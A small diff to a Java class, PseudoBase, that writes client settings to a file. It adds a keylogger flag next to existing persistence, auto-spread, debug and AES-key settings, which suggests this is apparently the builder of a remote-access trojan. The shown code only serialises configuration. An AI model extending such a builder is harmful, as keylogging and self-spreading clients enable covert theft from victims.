@@ -51,7 +51,8 @@ public class PseudoBase implements Repository {
             writer.write("" + ClientBuilder.isPersistent + "\n" + " ");
             writer.write("" + ClientBuilder.autoSpread + "\n" + " ");
             writer.write("" + ClientBuilder.isDebug + "\n" + " ");
-            writer.write("" + KumoSettings.AES_KEY);
+            writer.write("" + KumoSettings.AES_KEY + "\n ");
+            writer.write("" + ClientBuilder.keylogger);
         } catch (IOException i) {
             Logger.log(Level.ERROR, i.toString());
         }
